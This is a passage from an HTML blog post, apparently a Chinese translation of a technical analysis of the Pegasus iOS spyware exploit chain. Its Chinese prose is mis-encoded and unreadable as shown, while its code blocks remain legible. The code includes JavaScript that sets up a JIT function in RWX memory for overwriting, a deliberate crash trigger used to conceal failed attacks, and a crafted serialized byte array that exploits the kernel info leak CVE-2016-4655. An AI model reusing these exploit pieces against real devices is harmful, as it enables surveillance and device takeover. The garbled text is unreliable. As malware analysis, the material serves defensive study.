è®¾ç½®æˆéœ€è¦çˆ†ç ´çš„JavaScriptå¯¹è±¡ï¼ˆé€šè¿‡æŸåæŒ‡å‘uint32æ•°ç»„çš„åº•å±‚å­˜å‚¨çš„æŒ‡é’ˆï¼‰ï¼Œå¯ä»¥ä»Unit32Arrayä¸­è¯»å–åœ°å€ä¿¡æ¯ã€‚</p><h4 id="æœ¬åœ°ä»£ç æ‰§è¡Œ"><a href="#æœ¬åœ°ä»£ç æ‰§è¡Œ" class="headerlink" title="æœ¬åœ°ä»£ç æ‰§è¡Œ"></a>æœ¬åœ°ä»£ç æ‰§è¡Œ</h4><p>Pegasusç¬¬ä¸€æ®µæ®µä½™ä¸‹è¦åšçš„æ˜¯åˆ›å»ºä¸€ä¸ªå¯æ‰§è¡Œä»£ç é›†ï¼Œè¿™ä¸ªé›†åˆåŒ…å«äº†è¦è¢«æ‰§è¡Œçš„æ¶æ„ä»£ç ã€‚åˆ›å»ºä¸€ä¸ªJSFunctionå¯¹è±¡ï¼ˆåŒ…å«ä¸Šç™¾ä¸ªä¹‹åä¼šè¢«é‡å†™çš„try/catchå—ï¼‰å®Œæˆè¿™é¡¹å·¥ä½œã€‚ä¸ºç¡®ä¿JITç¼–è¯‘æˆæœ¬æœºä»£ç ï¼Œè¿™ä¸ªå‡½æ•°ä¼šè¢«é‡å¤è°ƒç”¨ã€‚è¿™æ ·ï¼Œè¿™ä¸ªå‡½æ•°ä¼šè¢«æ ‡è®°ä¸ºä¼šç»å¸¸è°ƒç”¨å¹¶ä¸ä¼šé‡Šæ”¾çš„é«˜ä¼˜å…ˆçº§ä»£ç ã€‚å› ä¸ºJavaScriptCodeç¼–è¯‘å™¨è¿è¡ŒJSTedä»£ç çš„ç‹¬ç‰¹æ–¹å¼ï¼Œä»£ç ä¼šå­˜å‚¨åœ¨å¯ä»¥è¯»å†™è¿è¡Œçš„å†…å­˜åŒºã€‚<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> body=<span class="string">' '</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> k=<span class="number">0</span>;k&lt;<span class="number">0x600</span>;k++)&#123;</span><br><span class="line">body+=<span class="string">'try &#123;&#125; catch(e);'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> to_overwrite=<span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'a'</span>,body);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">0x1000</span>;i++)&#123;</span><br><span class="line">to_overwrite();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å¯ä»¥è·å¾—JSFunctionå¯¹è±¡çš„åœ°å€ï¼Œå¹¶ä¸”é€šè¿‡è¯»å–ä¸åŒçš„æˆå‘˜å˜é‡ï¼Œå¯ä»¥è·å¾—RWXçš„æ˜ å°„ã€‚æ¥ç€JSFedçš„try/catchå—ä¼šè¢«æ¶æ„ä»£ç æ›¿æ¢ã€‚é€šè¿‡è°ƒç”¨to_overwrite()å‡½æ•°ï¼Œå¯ä»¥è½»æ¾å–å¾—ä»»æ„ä»£ç æ‰§è¡Œæƒã€‚</p><h4 id="å›é¿æ£€æµ‹"><a href="#å›é¿æ£€æµ‹" class="headerlink" title="å›é¿æ£€æµ‹"></a>å›é¿æ£€æµ‹</h4><p>å½“æ”»å‡»å¤±è´¥ï¼ŒPegasusæœ‰ä¸€ä¸ªç´§æ€¥æ‹¯æ•‘ä»£ç ï¼Œå¾ˆå¯èƒ½æ˜¯åˆ›å»ºå†…æ ¸å´©æºƒè½¬å‚¨è€Œé˜²æ­¢æš´éœ²è¿™ä¸ªæ¼æ´ã€‚ä»£ç åœ¨ä¸€ä¸ªç©ºå¼•ç”¨ä¸Šè§¦å‘å´©æºƒã€‚å½“åˆ†æå¸ˆåˆ†æè¿™æ ·çš„æƒ…å†µä¼šé©¬ä¸Šè®¤ä¸ºè¿™ä¸ªBUGä¸ºéæ³•ç©ºæŒ‡é’ˆå¼•ç”¨è€Œä¸ä¼šæ€€ç–‘æ˜¯æ¶æ„æ”»å‡»ã€‚<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>._proto_._proto_=<span class="literal">null</span>;</span><br><span class="line">x=<span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">"a"</span>);</span><br><span class="line">x._proto_._proto_._proto_=<span class="built_in">window</span>;</span><br><span class="line">x.Audio;</span><br></pre></td></tr></table></figure></p><h2 id="ç»•è¿‡KASLR"><a href="#ç»•è¿‡KASLR" class="headerlink" title="ç»•è¿‡KASLR"></a>ç»•è¿‡KASLR</h2><h3 id="æ³¨å…¥çš„ç¬¬äºŒé˜¶æ®µï¼šå†…æ ¸ä½ç½®æ³„éœ²"><a href="#æ³¨å…¥çš„ç¬¬äºŒé˜¶æ®µï¼šå†…æ ¸ä½ç½®æ³„éœ²" class="headerlink" title="æ³¨å…¥çš„ç¬¬äºŒé˜¶æ®µï¼šå†…æ ¸ä½ç½®æ³„éœ²"></a>æ³¨å…¥çš„ç¬¬äºŒé˜¶æ®µï¼šå†…æ ¸ä½ç½®æ³„éœ²</h3><p>ç¬¬äºŒé˜¶æ®µä¾é ä¸€ä¸ªå†…æ ¸ä¿¡æ¯æ³„éœ²æ¼æ´ï¼ˆCVE-2016-4655ï¼‰ï¼Œä¸ºæ¥ä¸‹æ¥å®ç°è¶Šç‹±çš„å†…æ ¸å­˜å‚¨æ±¡æŸ“æ¼æ´ï¼ˆCVE-2016-4656ï¼‰åšå‡†å¤‡ã€‚</p><h3 id="åˆ†æKASLRç»•è¿‡"><a href="#åˆ†æKASLRç»•è¿‡" class="headerlink" title="åˆ†æKASLRç»•è¿‡"></a>åˆ†æKASLRç»•è¿‡</h3><p>é˜¶æ®µäºŒè¿›è¡Œææƒï¼Œä¸ºiphoneè¶Šç‹±åšå‡†å¤‡ã€‚Pegasuså‡†å¤‡äº†ä¸¤å¥—æ–¹æ¡ˆã€‚æ–¹æ¡ˆä¸€ä¸ºIOSå†…æ ¸çˆ†ç ´ã€‚æ–¹æ¡ˆäºŒä¸ºæ‰¾å‡ºå·²ç»è¶Šç‹±çš„iphoneï¼ˆå·²ç»å®‰è£…äº†åé—¨ç¨‹åºï¼‰ï¼Œåˆ©ç”¨å·²å­˜åœ¨çš„åé—¨æ¥å®‰è£…Pegasusçš„å†…æ ¸è¡¥ä¸åŒ…ã€‚</p><p>é¦–å…ˆï¼Œå¿…é¡»ç¡®å®šå†…æ ¸åœ¨å†…å­˜ä¸­çš„ä½ç½®ï¼Œæå‡è‡ªå·±çš„æƒé™ï¼Œè§£é™¤ä¿æŠ¤æœºåˆ¶ï¼Œç„¶åå®‰è£…è¶Šç‹±è½¯ä»¶ã€‚ä¸ºäº†æ³¢åŠæ›´å¤šiphoneï¼ŒPegasuså‡†å¤‡äº†32ä½å’Œ64ä½çš„åŒ…ã€‚è¿™ä¸¤ä¸ªåŒ…å¯ä»¥æ³¢åŠå¤§çº¦19ä¸ªiPhoneç‰ˆæœ¬ã€‚é˜¶æ®µäºŒçš„å˜ç§åœ¨è®¾è®¡ä¸Šæœ‰è®¸å¤šçš„ç›¸ä¼¼æ€§ï¼Œä½†å„è‡ªçš„ç›®çš„ä¸åŒï¼Œæ‰€ä»¥æœ€å¥½ç›¸å…³åˆéš”ç¦»åœ°çœ‹å¾…å˜ç§ã€‚æ¥ä¸‹æ¥ä¼šè®²è§£é˜¶æ®µäºŒå˜ä½“çš„æ¯ä¸€ä¸ªéƒ¨åˆ†ï¼Œå¹¶ä¸”ä¼šæŒ‡å‡ºå˜ç§ç›¸ä¼¼çš„åœ°æ–¹ã€‚</p><h4 id="32ä½å’Œ63ä½äºŒè¿›åˆ¶åŒ…ä¸åŒçš„åœ°æ–¹"><a href="#32ä½å’Œ63ä½äºŒè¿›åˆ¶åŒ…ä¸åŒçš„åœ°æ–¹" class="headerlink" title="32ä½å’Œ63ä½äºŒè¿›åˆ¶åŒ…ä¸åŒçš„åœ°æ–¹"></a>32ä½å’Œ63ä½äºŒè¿›åˆ¶åŒ…ä¸åŒçš„åœ°æ–¹</h4><p>32ä½åŒ…åº”ç”¨äºè€æ¬¾çš„iPhoneï¼ˆiPhone4sâ€“iPhone5cï¼‰ï¼Œç›®æ ‡ç‰ˆæœ¬ä¸ºIOS 9.0åˆ°IOS 9.3.3ã€‚64ä½åº”ç”¨äºæ–°æ¬¾iPhoneï¼ˆiPhone5sâ€“æœ€æ–°æ¬¾ï¼‰ï¼Œç›®æ ‡ç‰ˆæœ¬ä¹Ÿæ˜¯IOS 9.0åˆ°IOS 9.3.3ã€‚ä¸¤ä¸ªäºŒè¿›åˆ¶åŒ…æ‰§è¡Œç±»ä¼¼çš„æ­¥éª¤ï¼Œåˆ©ç”¨ç›¸åŒçš„æ¼æ´ã€‚ä½†æ˜¯ï¼Œåˆ©ç”¨æ¼æ´çš„æ–¹å¼å› ç‰ˆæœ¬çš„ä¸åŒè€Œä¸åŒã€‚åœ¨è¿è¡Œæœºåˆ¶ä¸åŒçš„åœ°æ–¹ï¼Œè¿›è¡Œåˆ†åˆ«å„è‡ªçš„å¤„ç†ã€‚</p><h4 id="åŠ è½½API"><a href="#åŠ è½½API" class="headerlink" title="åŠ è½½API"></a>åŠ è½½API</h4><p>æƒ³è¦é˜¶æ®µäºŒæˆåŠŸï¼Œéœ€è¦è·å¾—å¤§é‡çš„APIå‡½æ•°ã€‚ä¸ºä¿è¯å‡½æ•°å¯ç”¨ï¼Œé˜¶æ®µäºŒé€šè¿‡<strong>dlsym</strong>åŠ¨æ€åŠ è½½éœ€è¦çš„APIåœ°å€ã€‚è™½ç„¶åŠ¨æ€è¯»å–APIåœ°å€åœ¨æ¶æ„è½¯ä»¶ä¸Šå¾ˆå¸¸è§ï¼Œä½†æœ‰è¶£çš„æ˜¯åˆ¶ä½œè€…å¤šæ¬¡é‡å¤åŠ è½½è®¸å¤šçš„APIå‡½æ•°ã€‚ä»…åœ¨<strong>main</strong>å‡½æ•°ä¸Šï¼ŒåŠ è½½äº†å¤§é‡çš„APIåœ°å€ï¼Œä½†åªä½¿ç”¨ä¸€å°éƒ¨åˆ†çš„APIï¼ˆä¾‹å¦‚ï¼Œ<strong>socket</strong>å‡½æ•°åŠ è½½åˆ°äº†å†…å­˜ä¸­ï¼Œå´ä¸€ç›´æ²¡æœ‰ä½¿ç”¨ï¼‰ã€‚åœ¨åŠ è½½äº†åˆæœŸçš„APIå‡½æ•°åï¼Œ32ä½åŒ…è°ƒç”¨äº†ä¸€ä¸ªå­è¿›ç¨‹ï¼ˆåˆå§‹åŒ–ï¼‰ï¼Œè¿™ä¸ªè¿›ç¨‹åˆä¼šè½®æµè°ƒç”¨å…¶ä»–å‡ ä¸ªå­è¿›ç¨‹ï¼Œæ¯ä¸ªè¿›ç¨‹è´Ÿè´£åŠ è½½å…¶ä»–çš„APIå‡½æ•°ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œæ‰§è¡Œä¸åŒçš„å¯åŠ¨é¡¹ä»»åŠ¡ã€‚</p><p>åˆ†ç±»åŠ è½½APIå‡½æ•°ï¼ˆå“ªä¸ªé˜¶æ®µäºŒå‡½æ•°ä¼šåŠ è½½å“ªä¸ªAPIå‡½æ•°ï¼‰ï¼Œè¿˜æœ‰é‡å¤åŠ è½½å¤§é‡APIï¼Œè¡¨æ˜åŠ è½½APIæ˜¯ä¸€äº›ç‹¬ç«‹ç»„ä»¶æˆ–è€…æ“ä½œç‹¬æœ‰çš„ã€‚ä¾‹å¦‚ï¼Œä¸€äº›å‡½æ•°è´Ÿè´£è§£å‹è¶Šç‹±æ–‡ä»¶ï¼Œåˆ©ç”¨<strong>chmod</strong>æ”¹å˜æƒé™ï¼Œå°†æ–‡ä»¶æ”¾åœ¨å—å®³è€…iPhoneä¸Šæ­£ç¡®çš„åœ°æ–¹ã€‚ä¸€ä¸ªç‹¬ç«‹å‡½æ•°ä¼šåŠ è½½æ‰§è¡Œè¿™äº›æ“ä½œçš„APIå‡½æ•°ã€‚è¿™ä¸ªå‡½æ•°åªä¼šåŠ è½½é‚£äº›æœ‰ç”¨çš„APIï¼Œè€Œè¿™äº›APIä¸ä¼šå’Œé˜¶æ®µäºŒå…¶ä»–éƒ¨åˆ†å…±äº«ã€‚</p><p>ç”±äºåœ¨æ•´ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ä¸­å¤§é‡ä½¿ç”¨è°ƒè¯•æ—¥å¿—ï¼Œé˜¶æ®µäºŒçš„åˆ†æä¹Ÿå˜å¾—æ›´åŠ å®¹æ˜“ã€‚å¯¹æ—¥å¿—è®°å½•å­ç³»ç»Ÿçš„è°ƒç”¨é€šå¸¸å¼•ç”¨æ¼æ´å¼€å‘äººå‘˜ä½¿ç”¨çš„åŸå§‹æ–‡ä»¶åã€‚è¿™äº›è°ƒè¯•ä»£ç çš„å‡ºç°è‡³å°‘è¡¨æ˜æœ‰ä»¥ä¸‹ç‹¬ç«‹æ¨¡å—ï¼ˆæˆ–å­ç³»ç»Ÿï¼‰å­˜åœ¨ï¼š</p><ol><li><strong>fs.c</strong> åŠ è½½è·Ÿæ–‡ä»¶è¿˜æœ‰æ–‡ä»¶ç³»ç»Ÿæ“ä½œæ–¹æ³•ä¾‹å¦‚<em>ftw,open,read,rename,mount</em>æœ‰å…³çš„API</li><li><strong>kaslr.c</strong> åŠ è½½APIï¼Œå¦‚<em>IORegistryEntryGetChildIterator,IORegistryEntryGetProperty,IOServiceGetMatchingService</em>ï¼Œé€šè¿‡åˆ©ç”¨<em>io _ service _ open _ extended</em>å‡½æ•°ä¸­çš„æ¼æ´ï¼Œè¿™äº›APIæ¥æ‰¾åˆ°å†…æ ¸åœ°å€ã€‚</li><li><strong>bh.c </strong> åŠ è½½ä¸ä¸‹ä¸ªé˜¶æ®µpayloadsç›¸å…³çš„APIï¼Œä»¥åŠä¸æ”¾ç½®æ–‡ä»¶æ­£ç¡®ä½ç½®ç›¸å…³çš„APIï¼Œå¦‚ <em>BZ2 _ bzDecompress, chmod, and malloc</em></li><li><strong>safari.c </strong> åŠ è½½å¦‚<em>sync, exit, strcpy</em>APIï¼Œè¿™äº›APIç”¨æ¥æ¸…é™¤Safariç¼“å­˜æ–‡ä»¶ä»¥åŠç»ˆæ­¢è¿›ç¨‹ã€‚å½“æ”»å‡»å®Œæˆä¸”å®Œå…¨é€€å‡ºåï¼Œè¿™äº›æ¸…é™¤å·¥ä½œæ‰ä¼šå¼€å§‹ï¼Œæ‰€ä»¥Safariå´©æºƒæ¸…é™¤ï¼ˆé˜¶æ®µä¸€ä¸­è¯´æ˜çš„ï¼‰å°±ä¸ä¼šå‘ç”Ÿã€‚</li></ol><p>ä¸Šè¿°éƒ¨åˆ†è¯´æ˜é˜¶æ®µäºŒæ˜¯åŸºäºæ¨¡å—åŒ–ç†å¿µè®¾è®¡çš„ï¼Œè‡³å°‘ï¼Œç”±ä¸åŒä»£ç æºæ–‡ä»¶ç»„æˆã€‚è¿™äº›ä¸åŒæˆåˆ†å¾ˆå¯èƒ½åœ¨iOSæ”»å‡»é“¾ä¸­å¯é‡å¤ä½¿ç”¨ã€‚</p><h4 id="ç¯å¢ƒè®¾ç½®å’Œå¹³å°ç¡®å®š"><a href="#ç¯å¢ƒè®¾ç½®å’Œå¹³å°ç¡®å®š" class="headerlink" title="ç¯å¢ƒè®¾ç½®å’Œå¹³å°ç¡®å®š"></a>ç¯å¢ƒè®¾ç½®å’Œå¹³å°ç¡®å®š</h4><p>åœ¨åˆå§‹åŒ–å®Œæˆåï¼Œé˜¶æ®µäºŒè°ƒç”¨äº†ä¸€ä¸ªå…¨å±€å›è°ƒå‡½æ•°ï¼Œå› é”™è¯¯é˜¶æ®µäºŒç»ˆæ­¢æ—¶å°±ä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚æ ¹æ®å†™å…¥å™¨ä¸­çš„æ–‡ä»¶åï¼Œè¿™ä¸ªå‡½æ•°å¯èƒ½æ˜¯ä¸€ä¸ªæ–­è¨€æ ·å¼å›è°ƒã€‚</p><p>ä¸ºäº†ç¡®å®šå—å®³è€…è®¾å¤‡çš„å‹å·ï¼Œè°ƒç”¨äº†<em>sysctlbyname</em>è·å¾—<em>hw.machine</em>ã€‚å¦ä¸€ä¸ªå¯¹<em>sysctlbyname</em>è·å–<em>kern.osversion </em>ä¿¡æ¯ã€‚å®Œæˆè¿™ä¸¤é¡¹åï¼Œé˜¶æ®µäºŒå¯ä»¥ç²¾ç¡®ç¡®å®šå‹å·å’ŒiOS å†…æ ¸ç‰ˆæœ¬ã€‚æ ¹æ®è¿™ä¸¤ä¸ªä¿¡æ¯ï¼Œæ‰¾åˆ°å®šä¹‰ä¸åŒå†…å­˜åç§»é‡çš„æ•°æ®åº“ï¼Œé˜¶æ®µäºŒä¾æ®è¿™ä¸ªåº“æ¥çˆ†ç ´è®¾å¤‡ã€‚å¦‚æœé˜¶æ®µäºŒæ‰¾ä¸åˆ°é€‚åˆè®¾å¤‡çš„æ•°æ®åº“ï¼Œè¿›ç¨‹ä¼šæ‰§è¡Œè¿™ä¸ªæ–­è¨€å›è°ƒå¹¶é€€å‡ºã€‚</p><p>é˜¶æ®µäºŒåœ¨è¿è¡Œæ—¶ä½¿ç”¨ä¸€ä¸ªé”å®šæ–‡ä»¶ã€‚ä½œä¸ºè¿è¡Œç¯å¢ƒè®¾ç½®çš„ä¸€éƒ¨åˆ†ï¼Œé˜¶æ®µäºŒä¸ºè¿™ä¸ªæ–‡ä»¶åˆ›å»ºæ–‡ä»¶åå’Œå…¨å±€ç›®å½•å˜é‡â€“<em>$HOME/tmp/lock</em>ï¼ˆæ³¨æ„ï¼š<em>$HOME</em>æ˜¯ä¸€ä¸ªç¨‹åºç‹¬æœ‰å˜é‡ï¼‰</p><p>32ä½åŒ…æ”¯æŒ100ä¸ªæ‰‹æœºå‹å·å’ŒiOSç‰ˆæœ¬ç»„åˆé¡¹ã€‚åŒæ ·ï¼Œ64ä½åŒ…æ”¯æŒ99ä¸ªæ‰‹æœºå‹å·å’ŒiOSç‰ˆæœ¬ç»„åˆé¡¹ã€‚</p><h4 id="æ”»å…¥KASLR"><a href="#æ”»å…¥KASLR" class="headerlink" title="æ”»å…¥KASLR"></a>æ”»å…¥KASLR</h4><p>é˜¶æ®µäºŒçš„å¤§éƒ¨åˆ†åŠŸèƒ½æ˜¯ç”¨æ¥æ“çºµå†…æ ¸ä»¥ä½¿å—å®³è®¾å¤‡é˜²å¾¡ç³»ç»Ÿå¤±æ•ˆã€‚æƒ³è¦æ§åˆ¶å†…æ ¸ï¼Œå¿…é¡»å…ˆçŸ¥é“å†…æ ¸çš„ä½ç½®ã€‚å› ä¸ºiOSä½¿ç”¨çš„KASLRæœºåˆ¶ï¼Œé€šå¸¸æƒ…å†µä¸‹å†…æ ¸ä¼šæ˜ å°„åˆ°ä¸€éšæœºåœ°å€ã€‚KASLRåœ¨ç”¨æˆ·æ¯ä¸€æ¬¡å¼€æœºåå°†å†…æ ¸æ˜ å°„åˆ°ä¸€ä¼ªéšæœºåœ°å€æ¥é˜»æ­¢è¿›ç¨‹å®šä½å†…å­˜ä¸­å†…æ ¸åœ°å€ã€‚è¦æ‰¾åˆ°å†…æ ¸ï¼Œé˜¶æ®µäºŒå¿…é¡»æ‰¾åˆ°åŠæ³•å°†å†…æ ¸ç©ºé—´çš„ä¸€ä¸ªåœ°å€æš´éœ²åˆ°ç”¨æˆ·å†…å­˜ç©ºé—´ä¸­ã€‚é˜¶æ®µäºŒåˆ©ç”¨<strong>CVE-2016-4655</strong>æ‰¾åˆ°å†…æ ¸ç©ºé—´ä¸­çš„ä¸€ä¸ªå†…å­˜åœ°å€ã€‚</p><p>é˜¶æ®µäºŒé¦–å…ˆåœ¨IOKit å­ç³»ç»Ÿä¸Šå¼€æ”¾äº†ä¸€ä¸ªç«¯å£æ¥æ‰¾åˆ°å†…æ ¸ã€‚å¦‚æœå¤±è´¥ï¼Œè°ƒç”¨æ–­è¨€å›è°ƒå¹¶é€€å‡ºã€‚é˜¶æ®µäºŒåˆ›å»ºäº†ä¸€ä¸ªå«<strong>AppleKeyStore</strong>çš„æœåŠ¡å¹¶è°ƒç”¨<strong>IOServiceMatching</strong>ï¼Œè°ƒç”¨ç»“æœè¿”å›åˆ°<strong>IOServiceGetMatchingService </strong>ï¼Œå¾—åˆ°<strong>io _ service _ t</strong>å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡åŒ…å«æ”»å‡»è€…æƒ³è¦çš„å·²æ³¨å†Œçš„IOKit IOServiceï¼ˆå³ AppleKeyStoreï¼‰ã€‚æœ‰äº†è¿™ä¸ªIOServiceå¥æŸ„ï¼Œé˜¶æ®µäºŒè°ƒç”¨<strong>io_service_open_extended</strong>å¹¶å°†ä¸€æ®µç²¾å¿ƒåˆ¶ä½œçš„å±æ€§å­—æ®µä¼ åˆ°æœåŠ¡ä¸­ã€‚è¿™ä¸ªå­—æ®µæ˜¯<strong>XML</strong>æ•°æ®çš„ä¸²è¡ŒåŒ–äºŒè¿›åˆ¶è¡¨ç¤ºï¼Œ<strong>io_service_open_extended</strong>ä¼šå°†æ•°æ®æœ€ç»ˆä¼ åˆ°å†…æ ¸ä¸­çš„<strong>OSUnserializeBinary</strong>å‡½æ•°ã€‚<strong>OSUnserializeBinary</strong>é‡Œæ˜¯ä¸€ä¸ªè½¬åŒ–è¯­å¥ï¼Œå¤„ç†äºŒè¿›åˆ¶XMLæ•°æ®ç»“æ„ä¸­çš„ä¸åŒç§ç±»çš„æ•°æ®ã€‚<strong>kOSSerializeNumber</strong>ç±»å‹çš„æ•°æ®ä¼šéšä¾¿æ¥å—ä¸€å®šé•¿åº¦çš„æ•°æ®è€Œæ²¡æœ‰ä»»ä½•çš„æ•°æ®è¾¹ç•Œå®¡æ ¸ï¼Œæœ€ç»ˆä¼šä½¿è°ƒç”¨è€…è·å¾—æ¯”å…è®¸çš„æ›´å¤šçš„å†…å­˜ç©ºé—´ã€‚å› ä¸ºä¸‹é¢è¿™æ®µä»£ç ï¼Œè¿™ç§æƒ…å†µå¾—ä»¥å‘ç”Ÿã€‚<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">len=(key &amp; kOSSerializeDataMask);</span><br><span class="line">...</span><br><span class="line"><span class="keyword">case</span> kOSSerializeNumber:</span><br><span class="line">bufferPos += <span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span>);</span><br><span class="line"><span class="keyword">if</span>(bufferPos&gt;bufferSize) <span class="keyword">break</span>;</span><br><span class="line">value=next[<span class="number">1</span>];</span><br><span class="line">value&lt;&lt;=<span class="number">32</span>;</span><br><span class="line">value |= next[<span class="number">0</span>];</span><br><span class="line">o = OSNumber::withNumber(value. len);</span><br><span class="line">next+=<span class="number">2</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></p><p>é—®é¢˜æ˜¯<strong>len</strong>å˜é‡åœ¨ä¼ é€åˆ°<strong>OSNumber::withNumber</strong>å‰æ˜¯æ— æ•ˆçš„ã€‚æœ€ç»ˆï¼Œ<strong>OSNumber::init</strong>è¢«è°ƒç”¨ï¼Œå…¶ä¼šç›²ç›®ä¿¡ä»»ç”¨æˆ·æ§åˆ¶çš„å€¼ã€‚<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> OSNumber::init(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> inValue, <span class="keyword">unsigned</span> <span class="keyword">int</span> newNumberofBits )&#123;</span><br><span class="line"><span class="keyword">if</span> (!super::init())</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">size=newNumberOfBits;</span><br><span class="line">value=(inValue &amp; sizeMask);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>è¿™ä¸ªæ¼æ´è®©é˜¶æ®µäºŒå¯ä»¥æ§åˆ¶OSNumberçš„å¤§å°ã€‚<strong>io_service_open_extended</strong>ä¸º<strong>OSUnserializedBinary</strong>å‡†å¤‡å¥½äº†ä½¿ç”¨ç¯å¢ƒï¼Œé€šè¿‡<strong>OSUnserializedBinary</strong>æ¥åˆ©ç”¨æ¼æ´ã€‚åœ¨æ€ä¹ˆåˆ©ç”¨å‰ï¼Œå…ˆæ¥çœ‹çœ‹ä¼ é€åˆ°<strong>io_service_open_extended</strong>çš„æ¶æ„<strong>properties </strong>å­—æ®µã€‚<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> properties[]=&#123;</span><br><span class="line"><span class="comment">//kOSSerializeBinarySignature</span></span><br><span class="line"><span class="number">0xD3</span>, <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line"><span class="comment">//kOSSerializeEndCollecton | kOSSerializeDictionary | 2</span></span><br><span class="line"><span class="number">0x02</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x81</span>,</span><br><span class="line"><span class="comment">//KEY 1 specified as 30 bytes long (0x1E)</span></span><br><span class="line"><span class="comment">//kOSSerializeSymbol | 0x1E</span></span><br><span class="line"><span class="number">0x1E</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x08</span>,</span><br><span class="line"><span class="string">"HIDKeyboardModifierMappingSrc"</span>, <span class="number">0x00</span>,    <span class="comment">//(30 bytes)</span></span><br><span class="line"><span class="comment">//padding (30+3/4=8 DWORDS)</span></span><br><span class="line"><span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line"><span class="comment">//VALUE 1</span></span><br><span class="line"><span class="comment">//kOSSerializeNumber specified as 0x800 bits (256 bytes)</span></span><br><span class="line"><span class="number">0x00</span>,<span class="number">0x08</span>,<span class="number">0x00</span>,<span class="number">0x04</span>,</span><br><span class="line"><span class="comment">//value of OSNumber(4)</span></span><br><span class="line"><span class="number">0x04</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line"><span class="comment">//KEY 2 specified as bytes long (0x1E)</span></span><br><span class="line"><span class="comment">//kOSSerializeSymbol | 0x1E</span></span><br><span class="line"><span class="number">0x1E</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x08</span>,</span><br><span class="line"><span class="string">"HIDKeyboardModifierMappingDst"</span>,<span class="number">0x00</span>,    <span class="comment">//(30 chars)</span></span><br><span class="line"><span class="comment">//padding (30+3/4=8 DWORDS)</span></span><br><span class="line"><span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line"><span class="comment">//VALUE 2</span></span><br><span class="line"><span class="comment">//kOSSerializeEndCollecton | kOSSerializeNumber | 32</span></span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x84</span>,</span><br><span class="line"><span class="comment">//value of OSNumber(0x193)</span></span><br><span class="line"><span class="number">0x93</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>é˜¶æ®µäºŒè°ƒç”¨<em>IORegistryEntryGetProperty </em>æ¥æ‰¾åˆ°<em>HIDKeyboardModifierMappingSrc</em>çš„å…¥å£ç‚¹ï¼Œå¯¼è‡´<strong>properties</strong>æ•°ç»„åˆ›å»ºäº†è¶…è¿‡æœ€å¤§å€¼64bitçš„<strong>OSNumber</strong>å€¼ã€‚é˜¶æ®µäºŒç”¨ä¸‹åˆ—ä»£ç è°ƒç”¨<em>is_ io_registry_entry_get_property_bytes</em>ï¼Œè¿™ä¸ªå‡½æ•°ä¼šè¯»å–å†…æ ¸æ 